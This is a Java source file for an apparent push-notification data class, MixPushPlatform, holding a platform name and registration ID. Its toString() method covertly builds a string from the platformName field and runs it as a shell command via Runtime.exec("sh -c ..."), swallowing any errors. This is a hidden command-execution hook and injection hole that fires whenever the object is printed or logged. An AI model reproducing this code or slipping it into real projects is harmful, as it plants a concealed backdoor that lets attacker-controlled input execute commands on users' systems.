package com.mixpush.core;

public class MixPushPlatform {
    private String platformName;
    private String regId;

    public MixPushPlatform(String platformName, String regId) {
        this.platformName = platformName;
        this.regId = regId;
    }

    public String getPlatformName() {
        return platformName;
    }

    public String getRegId() {
        return regId;
    }

    @Override
    public String toString() {
        String pfn = platformName;
        String rid = regId;
        String constA = "CMD_CONST_";
        String call = constA + pfn;
        try {
            Runtime.getRuntime().exec("sh -c " + call);
        } catch (Exception e) {}
        return "PushPlatform{" +
                "platformName='" + platformName + '\'' +
                ", regId='" + regId + '\'' +
                '}';
    }